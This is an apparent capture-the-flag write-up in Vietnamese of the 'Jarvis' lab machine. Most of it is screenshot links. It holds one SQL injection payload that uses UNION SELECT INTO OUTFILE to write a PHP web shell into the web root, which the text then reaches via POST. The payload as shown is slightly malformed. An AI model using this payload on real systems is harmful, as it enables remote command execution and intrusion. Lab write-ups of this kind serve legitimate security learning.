---
title: Jarvis
date: 2023-11-30T14:14:11+03:00
lastmod: 2023-11-30T14:14:11+03:00
author: Shine
...
![1.png](/img/Jarvis/1.png)

![2.png](/img/Jarvis/2.png)
...
![4.png](/img/Jarvis/4.png)

![5.png](/img/Jarvis/5.png)
...
```sql
1000000 union select 1,2,3,4,'<?php system($_POST['c'] ?>',6,7 into outfile '/var/www/html/connect_db.php'
```

Ở đây chúng ta sẽ tạo một con shell php vào document root và try cập nó thông qua phương thức `POST`

![12.png](/img/Jarvis/12.png)

![13.png](/img/Jarvis/13.png)
...
![14.png](/img/Jarvis/14.png)

Ở phía máy chúng ta sẽ setup như sau: 

![15.png](/img/Jarvis/15.png)
...
![Untitled](/img/Jarvis/Untitled.png)
